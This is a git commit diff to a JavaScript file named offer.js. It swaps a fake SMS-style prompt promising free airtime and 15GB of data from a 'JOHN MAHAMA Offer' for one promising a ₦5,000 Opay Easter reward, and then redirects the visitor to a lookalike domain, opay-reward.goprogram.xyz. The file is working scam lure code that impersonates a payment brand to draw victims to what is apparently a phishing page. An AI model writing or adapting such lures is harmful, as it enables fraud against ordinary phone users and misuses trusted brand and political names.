cd4a24657f11919f51c2608a83db147904ef9a83
realmankeny <realmankeny@gmail.com>
2025-04-15 19:34:49 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'WITHDRAW ₦5,000'
+password=prompt('SMS: Congratulations Your Opay Eligible to receive ₦5,000 Easter Offer, Kindly Press OK to PROCEED ','WITHDRAW ₦5,000');
+if (password != 'WITHDRAW ₦5,000') {
+location.href='https://opay-reward.goprogram.xyz/easter';
 }
